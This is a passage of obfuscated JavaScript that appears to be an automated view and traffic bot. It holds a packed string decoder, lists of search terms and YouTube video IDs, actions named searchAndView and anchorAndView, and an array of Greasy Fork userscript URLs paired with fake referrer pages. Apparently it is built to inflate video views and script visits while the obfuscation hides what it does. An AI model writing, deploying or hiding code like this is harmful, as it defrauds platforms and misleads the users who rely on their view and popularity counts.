'zyenith']['repeatExte' + 'nd'](0x956 + -0xb9 * 0x14 + 0x528 * 0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x184c + 0x1 * 0x1b1f + 0x2c9 * -0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1fbd * 0x1 + -0xdea + -0xbe * 0x18);

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1e * 0x9d + -0x1f * -0x4e + -0x6 * -0x17e);
    let h = e[f];
    if (b['rhpibk'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x283 + -0x9 * -0x28d + -0x2 * 0xa39, s, t, u = 0xc79 + -0x1e44 + -0x1 * -0x11cb; t = n['charAt'](u++); ~t && (s = r % (-0x4 * 0x61b + -0x177e + -0x996 * -0x5) ? s * (-0x1d89 + -0x177 * -0x2 + -0x19 * -0x113) + t : t, r++ % (0x19d * 0xe + -0x24f2 * 0x1 + 0xe60)) ? p += String['fromCharCode'](-0x256d + 0x1231 + -0x143b * -0x1 & s >> (-(-0x1b * -0x11b + 0x2 * 0x10f2 + -0x3fbb) * r & 0x4 * -0x6fa + 0x81 * 0x8 + 0xbf3 * 0x2)) : 0x210e + -0x576 + -0x6e6 * 0x4) {
          t = o['indexOf'](t);
        }
        for (let v = -0x149b + 0x1727 * 0x1 + 0x2 * -0x146, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x19b9 + 0x1fd2 + -0x609))['slice'](-(0xa89 * -0x3 + 0x1 * 0xa78 + 0x1525));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x23a * -0xf + 0x1c00 * 0x1 + 0x21e * -0x1d,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x14ec + -0x1 * 0x673 + -0xe79; u < 0x1112 + -0x12b * -0x6 + -0x1714; u++) {
          p[u] = u;
        }
        for (u = 0x2070 + 0xe46 + 0x175b * -0x2; u < -0xeaa + 0x2615 + -0x779 * 0x3; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0xb46 + 0x35a + 0x10 * -0xda), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x42 * -0x31 + -0x184e + -0x53 * -0x24, q = -0x1 * 0x71 + -0x15dd + 0x2 * 0xb27;
        for (let v = 0x560 * -0x4 + -0x136 * 0x20 + 0x1 * 0x3c40; v < n['length']; v++) {
          u = (u + (-0x17dd * -0x1 + 0x262e + 0x3 * -0x14ae)) % (-0x4 * -0x426 + -0x7 * -0x1a5 + -0x1b1b), q = (q + p[u]) % (-0x1cf3 + -0xb89 * 0x1 + -0xb4 * -0x3b), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * -0x19a4 + -0x6af * 0x3 + -0x5 * 0xeb)]);
        }
        return t;
      };
      b['lDMuNq'] = m, c = arguments, b['rhpibk'] = !![];
    }
    const j = e[0x1a38 + 0x12 + -0x1a4a],
      k = f + j,
      l = c[k];
    return !l ? (b['eJttWU'] === undefined && (b['eJttWU'] = !![]), h = b['lDMuNq'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    a3(0x18) + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    a1(0x8, '0@49') + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    a3(0x13) + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    a1(0x1e, 'Tepe') + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a1(0x2b, '6VTr') + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + a2(0x0)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a2(0xe) + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': a1(0x28, 'r9r8') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + a3(0x24) + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + a1(0x27, 'vzGv') + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + a3(0xa) + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + a1(0x4, 'Tepe') + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
